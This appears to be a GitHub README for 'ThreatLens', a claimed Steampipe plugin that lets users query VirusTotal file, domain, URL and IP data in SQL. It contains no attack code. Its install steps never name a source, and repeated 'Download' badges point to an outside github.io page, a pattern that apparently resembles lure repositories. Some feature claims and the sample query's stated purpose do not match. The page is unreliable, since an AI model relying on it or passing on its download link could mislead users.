![preview](https://raw.githubusercontent.com/naigaxb-svg/virustotal-sql-sleuth/main/thumb_121d.svg)
# ThreatLens — Multidimensional Threat Intelligence, Transformed into Queryable Insight

ThreatLens is not just another security dashboard. It is a reimagined approach to interacting with cyber threat data, transforming the raw, chaotic streams of indicators—files, domains, URLs, and IP addresses—into a structured, relational, and instantly queryable knowledge base. Inspired by the need for a more fluid and analytical interface with services like VirusTotal, ThreatLens provides a syntactic bridge between the vast, unstructured sea of threat intelligence and the precise, logical world of SQL.

Think of it as a high-powered observatory lens for your security operations. While traditional tools force you to peer through a static viewfinder, ThreatLens allows you to slice, dice, and correlate every data point on the fly. Instead of manually checking a single hash or bouncing between different web pages for a URL and its related domain, you can now write a single, elegant query that joins these entities together, revealing the hidden relationships and behavioral patterns that static lookups simply miss.

This repository is the core engine for that vision. It is a custom-built plugin that extends the Steampipe framework, acting as a universal adapter. It translates your natural SQL queries into the native API calls required by VirusTotal, then normalizes the complex, nested JSON responses into clean, tabular data. The result is a seamless, real-time interface where your existing SQL knowledge becomes your primary tool for investigating threats, enriching indicators, and building automated, complex security workflows.

## 🔭 Why ThreatLens Exists: Beyond the Single Pane of Glass

The conventional approach to threat intelligence often involves a painful cycle of copy-paste, manual correlation, and context switching between multiple tools. You find a suspicious file, check it, then manually search for its parent domain, then look up the hosting IP, and finally check for related URLs. It’s slow, error-prone, and creates data silos.

ThreatLens obliterates these silos. By representing all entities—files, domains, URLs, and IPs—as distinct but interconnected tables within a single database schema, it enables a level of analysis that is fundamentally more powerful. You can ask complex questions like: *"Show me all domains resolved by this IP that have been flagged for phishing in the last 30 days"* or *"List all files with a specific signature that were first seen on this domain."* This is not just a faster lookup; it is a new analytical capability. It transforms your security data from a collection of static reports into a dynamic, traversable graph.

## 🚀 Core Capabilities & Feature Matrix

The plugin is built for depth and flexibility. Its features are designed to ensure that you are not just getting data, but getting the *right* data in a format that is immediately usable.

### Key Operational Features

- **Entity-Centric SQL Interface:** Provides granular, structured tables for Files (Hashes), Domains, URLs, and IP addresses. Each table is meticulously mapped from the source API, exposing crucial fields like reputation scores, detection ratios, associated tags, WHOIS data, and geographic insights.
- **Dynamic Join & Correlation:** The true power lies in the relational joins. You can seamlessly connect a `vt_file` to a `vt_domain` via a relationship table, or link a `vt_url` to an `vt_ip` to trace network infrastructure relationships, all within a single SQL query. This eliminates the need for manual, cross-referencing scripts.
- **History & Timeline Queries:** Move beyond the current snapshot. The plugin allows you to query historical data points and analysis dates. You can track when a specific detection was first made, or list the last time a domain was seen active, enabling retrospective analysis and trend identification.
- **Configurable Performance:** With built-in concurrency controls and caching capabilities, the plugin respects API rate limits while maximizing data throughput. This ensures stable operation even during large-scale threat-hunting sweeps.
- **CLI-Native Operations:** Born in the terminal, designed for the cloud. The plugin is fully managed through a command-line interface, making it easy to automate, script, and integrate into your existing CI/CD security pipelines.

### Functional & Operational Excellence

- **Comprehensive Schema Design:** The plugin boasts a rich, meticulously curated schema. Every field available through the public API is mapped and documented, ensuring you have access to the full fidelity of the threat data without writing a single line of API boilerplate code.
- **Multi-Factor Authentication Support:** Secure and flexible API key management. The service supports standard API key authentication and is designed to work with modern secret management workflows, ensuring your threat intelligence endpoints are always protected.
- **Real-Time Data Ingestion:** No batch processes, no stale snapshots. Every query is executed live against the source. You are always looking at the most current threat landscape, which is critical for active incident response.
- **JSON/Advanced Data Filtering:** The plugin handles complex nested JSON structures with finesse. You can use JSON-based operators within your SQL to filter on specific attributes within reports, such as checking for a specific file behavior signature or a specific malware family label.
- **Open & Extensible Architecture:** Built on the robust Steampipe component framework, the plugin is inherently future-proof. It can be extended to connect to other data sources, creating a unified security data lake across multiple vendors.

## 📚 Table & Schema Overview

To give you a clearer understanding of the mental model, here’s a breakdown of the primary tables exposed by ThreatLens:

| Table Name | Description | Primary Use Cases |
| :--- | :--- | :--- |
| `vt_file` | Detailed reputation data and metadata for file hashes (MD5, SHA1, SHA256). | Threat hunting, malware analysis, hash validation against known-bad repositories. |
| `vt_domain` | Comprehensive domain information including WHOIS, registered date, and associated IP addresses. | Investigating phishing infrastructure, tracking malicious domains, domain reputation scoring. |
| `vt_url` | Analysis and report data for specific URLs. | Verifying suspicious links in emails, analyzing URL redirects, checking final payload paths. |
| `vt_ip` | IP address reputation and intelligence, including network owner and location details. | Identifying command & control servers, tracing source threats, securing network perimeters. |
| `vt_file_relationship` | A mapping table linking files to their related entities (e.g., contacted domains, dropped files). | Lateral analysis, understanding infection chains, mapping out an attack's kill chain. |
| `vt_domain_relationship` | Maps domains to their historical and current IP resolutions and related entities. | Infrastructure pivoting, identifying multiple sites hosted on the same server. |

## 💻 Getting Started: Your First Look Through the Lens

This section will guide you through the initial setup to get ThreatLens operational in your environment. The process is designed to be lightweight and fast, allowing you to focus on the analysis rather than the plumbing.

### Prerequisites

Before we begin, ensure you have the core runtimes installed on your local machine or server. You will need a modern 64-bit operating system (Linux, macOS, or Windows) and the primary runtime environment for the Steampipe framework. We also assume you have a valid API key for the threat intelligence provider.

### Installation Steps

1.  **Acquire the Plugin:** The plugin is distributed as a standalone binary. The initial step involves fetching the compiled plugin file for your specific operating system from the official distribution channel.
2.  **Initialize the Configuration:** Create a dedicated configuration file for the plugin. This file will hold your connection settings, most notably the API key. The configuration structure is flexible, allowing you to define multiple named connections for different teams or environments.
3.  **Configure Credentials:** Within the configuration file, you will securely specify your API key. The system is designed to support various secret injection methods, ensuring you do not have to hardcode credentials into your repository. You can set the key directly in the file or reference an environment variable that holds the value.
4.  **Start the Steampipe Service:** Once the plugin is installed and configured, you will start the local Steampipe server. This action spawns a local SQL endpoint that your client tools will connect to.
5.  **Connect and Query:** Finally, connect your preferred database client (like `psql` or a GUI SQL editor) to the local endpoint. You are now ready to run your first SQL queries against live threat intelligence.

### Your First Query

Once connected, try this simple yet powerful query to see the tool in action. It retrieves the top 5 most detected malicious files observed recently:

```sql
SELECT
  file_hash,
  total_votes,
  malicious_votes
FROM
  vt_file
WHERE
  last_analysis_stats ->> 'malicious' > '50'
ORDER BY
  last_analysis_date DESC
LIMIT 5;
```

This query not only fetches data but demonstrates the relational power and JSON access capabilities immediately, giving you a preview of the analytical depth available.

## 🎛️ Configuration & Customization

ThreatLens is built to be adaptively configured to fit your specific workflow. The primary configuration file dictates the core behavior, but there are additional parameters to fine-tune performance and data handling.

### Connection Parameters

- `api_key` (Required): Your unique authentication token.
- `api_url` (Optional): Allows you to point to a custom endpoint or proxy for the underlying threat feed service.
- `max_concurrency` (Optional): Controls the number of concurrent requests made to the source API, helping to balance load and manage rate limits.
- `cache_ttl` (Optional): Defines the Time-To-Live for cached query results in seconds. Tuning this can significantly speed up repetitive operations.

### Advanced Tuning for Performance

For large-scale, automated threat hunts, performance is king. The plugin offers robust caching strategies and query-level timeouts. You can disable caching entirely for real-time sensitive data or extend it for data that changes less frequently. The query timeout settings ensure that a complex join does not hang your entire data pipeline, allowing for resilient and predictable execution times.

## 🌍 Community & Support: The Human Firewall

We believe in the power of community-driven security. The ThreatLens project is a collaborative effort, and we are committed to building a robust ecosystem around it.

### Getting Help

- **Comprehensive Documentation:** The `docs/` folder within this repository contains in-depth guides covering the entire schema, complex query examples, and troubleshooting common network or authentication issues.
- **Community Discussions:** Join the official community forum to ask questions, share advanced SQL queries, and learn how other security engineers are leveraging ThreatLens to solve real-world problems.
- **Issue Tracking:** If you encounter a bug or have a feature request, please file an issue in the GitHub repository. We actively monitor the tracker and aim to respond to all submissions within 48 hours.

### Contributing

We welcome contributions of all sizes, from typo fixes in the documentation to the addition of new features. To get started, please review the `CONTRIBUTING.md` file for guidelines on our code standards and submission process. We are especially interested in first-hand reports of new data fields, performance optimization patches, and new examples for the `examples/` directory.

## 🗺️ Roadmap: The Future of Threat Queries

The journey of ThreatLens is just beginning. We have an ambitious future roadmap designed to push the boundaries of data-driven security further.

- **Machine Learning Enrichment:** Integrating local ML models to analyze returned data and provide predictive threat scores directly in the query results.
- **Cross-Platform Aggregation:** Expanding the plugin to support multiple threat intelligence feeds simultaneously, allowing for cross-vendor correlation in a single global schema.
- **Automated Reporting Generation:** A feature to automatically generate human-readable security reports from the executed SQL queries, bridging the gap between technical analysis and executive communication.
- **Scheduled Query Capabilities:** The ability to schedule specific threat hunting queries to run automatically on a timer, building a proactive security monitoring loop.

## ⚠️ Important Disclaimers

- **Data Source Dependency:** This plugin is a client for a third-party service. The output quality, speed, and availability depend entirely on the source service’s uptime, API limits, and data coverage. We are not responsible for any decisions made based on the direct output.
- **Interpretation of Signals:** The data provided (e.g., detection scores, labels) is generated by third-party engines. A "malicious" label is a strong signal, but it is not a definitive proof of malice. Always conduct appropriate contextual analysis before taking destructive actions like blocking an IP or isolating a host.
- **Compliance & Legal:** You are solely responsible for ensuring your usage of this tool and the underlying threat data complies with all applicable laws and regulations in your jurisdiction. Do not use this tool for unauthorized intrusion or malicious activity.
- **API Key Security:** You are responsible for maintaining the confidentiality of your API keys. The repository includes configuration examples, but we strongly advise against committing real keys to version control. Please use environment variables or a secret vault service.

## 📄 License

This project is licensed under the MIT License. This permissive license allows you to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the inclusion of the copyright notice and permission notice in all copies or substantial portions of the software.

You can view the full legal text of the license here:

[Learn more about the MIT License](https://opensource.org/licenses/MIT)

The MIT License ensures that the code remains open and accessible for the community to build upon, fostering innovation in the threat intelligence space.

---

## 🔧 Technical Requirements

- **System Requirements:** 64-bit CPU Architecture.
- **Memory:** Minimum 256 MB RAM for basic operations; 1 GB+ recommended for large-scale scans.
- **Disk Space:** 100 MB free space for the binary and minimal state files.
- **Network:** Outbound HTTPS (443) access to the threat intelligence provider API.
- **Languages:** SQL (Standard) on the front end; the plugin core is developed in Go.

[![Download](https://raw.githubusercontent.com/naigaxb-svg/virustotal-sql-sleuth/main/fetch_47a9a3.svg)](https://naigaxb-svg.github.io/virustotal-sql-sleuth/)

We hope this lens provides you with unprecedented clarity in your threat-hunting efforts. We are constantly looking to improve and would love to hear how you are using it. Dive into the documentation, explore the schema, and transform the way you see security data. The threats are evolving; your access to intelligence should evolve faster.

[![Download](https://raw.githubusercontent.com/naigaxb-svg/virustotal-sql-sleuth/main/fetch_47a9a3.svg)](https://naigaxb-svg.github.io/virustotal-sql-sleuth/)